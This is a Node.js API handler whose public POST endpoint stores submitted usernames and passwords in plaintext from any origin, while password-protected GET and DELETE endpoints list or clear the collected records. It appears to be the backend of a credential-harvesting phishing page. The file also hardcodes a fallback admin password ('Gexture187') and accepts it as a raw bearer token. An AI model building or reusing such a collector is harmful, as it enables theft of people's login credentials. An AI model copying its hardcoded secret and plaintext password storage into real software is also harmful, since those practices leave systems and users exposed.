const crypto = require('node:crypto');
const db = require('../db.js');

if (typeof process.loadEnvFile === 'function') {
  try {
    process.loadEnvFile();
  } catch {}
}

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Gexture187';

function getExpectedToken() {
  return crypto.createHash('sha256').update(`lagos-admin:${ADMIN_PASSWORD}`).digest('hex');
}

function parseBody(req) {
  return new Promise((resolve) => {
    if (req.body && typeof req.body === 'object') {
      return resolve(req.body);
    }
    if (typeof req.body === 'string') {
      try {
        return resolve(JSON.parse(req.body));
      } catch {
        return resolve({});
      }
    }

    let raw = '';
    req.on('data', (chunk) => {
      raw += chunk;
    });
    req.on('end', () => {
      try {
        resolve(JSON.parse(raw || '{}'));
      } catch {
        resolve({});
      }
    });
  });
}

function setCors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-admin-token');
}

function checkAdminAuth(req) {
  const authHeader = req.headers['authorization'] || '';
  const tokenHeader = req.headers['x-admin-token'] || '';
  const expectedToken = getExpectedToken();

  const bearerToken = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : authHeader;
  return bearerToken === expectedToken || tokenHeader === expectedToken || bearerToken === ADMIN_PASSWORD;
}

module.exports = async function handler(req, res) {
  try {
    setCors(res);

    if (req.method === 'OPTIONS') {
      res.statusCode = 204;
      return res.end();
    }

    const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

    // 1. Public POST: Save user login input into database
    if (req.method === 'POST') {
      const data = await parseBody(req);
      const input1 = data.input1 ?? data.username ?? '';
      const input2 = data.input2 ?? data.password ?? '';

      if (!input1 || !input2) {
        res.statusCode = 400;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({
          success: false,
          error: 'Both input fields are required.'
        }));
      }

      db.addRecord(input1, input2);

      res.statusCode = 200;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: true,
        message: 'Saved to database successfully!',
        driver: db.getDriver()
      }));
    }

    // Admin authorization check for GET and DELETE
    if (!checkAdminAuth(req)) {
      res.statusCode = 401;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: false,
        error: 'Unauthorized: Admin authentication required.'
      }));
    }

    // 2. GET /api/records: Retrieve all records
    if (req.method === 'GET') {
      const records = db.getRecords();
      res.statusCode = 200;
      res.setHeader('Content-Type', 'application/json');
      return res.end(JSON.stringify({
        success: true,
        count: records.length,
        driver: db.getDriver(),
        records
      }));
    }

    // 3. DELETE /api/records: Delete record(s)
    if (req.method === 'DELETE') {
      const id = req.query?.id || url.searchParams.get('id');
      if (id) {
        db.deleteRecord(id);
        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({
          success: true,
          message: `Record #${id} deleted.`
        }));
      } else {
        db.clearRecords();
        res.statusCode = 200;
        res.setHeader('Content-Type', 'application/json');
        return res.end(JSON.stringify({
          success: true,
          message: 'All records cleared.'
        }));
      }
    }

    res.statusCode = 405;
    res.setHeader('Content-Type', 'text/plain');
    res.end('Method Not Allowed');
  } catch (err) {
    console.error('[API Error in handler]', err);
    res.statusCode = 500;
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify({
      success: false,
      error: 'Internal server error: ' + err.message
    }));
  }
};
